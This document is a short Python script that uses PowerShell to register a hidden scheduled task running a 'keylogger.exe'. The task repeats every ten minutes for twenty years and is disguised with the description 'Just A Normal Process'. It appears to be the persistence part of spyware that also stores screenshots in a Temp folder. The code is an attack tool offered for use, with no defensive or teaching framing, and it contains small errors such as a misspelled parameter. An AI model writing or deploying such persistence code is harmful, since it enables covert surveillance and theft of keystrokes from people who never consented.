import subprocess
import os

# Use triple quotes string literal to span PowerShell command multiline
# if needed within the $action line : -Argument "C:\\path\\to\\file.exe"
cmd = """
$action = New-ScheduledTaskAction -Execute "C:\\path\\to\\keylogger.exe" 
$description = "Just A Normal Process"
$settings = New-ScheduledTaskSettingsSet -DeleteExpiredTaskAfter (New-TimeSpan -Seconds 2)
$taskName = "SmileYoureOnCamera"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetionDuration (New-TimeSpan -Days (365 * 20))
Register-ScheduledTask -TaskName $taskName -Description $description -Action $action -Settings $settings -Trigger $trigger | Out-Null
"""

#need to add the created-task path if desired too

# Use a list to make it easier to pass argument to subprocess
listProcess = [
    "powershell.exe",
    "-NoExit",
    "-NoProfile",
    "-Command",
    cmd
]



#\Storage doesn't exist, we have to create it first. 
#
#\Screenshots is created via script, so this should only run the 
# first execution of the .exe since after one run \Screenshots exists. 
pathname = "C:\\Windows\\Users\\Admin\\AppData\\Local\\Temp\\Storage\\Screenshots"
if not os.path.exists(pathname):
    subprocess.run(listProcess, check=True)
    

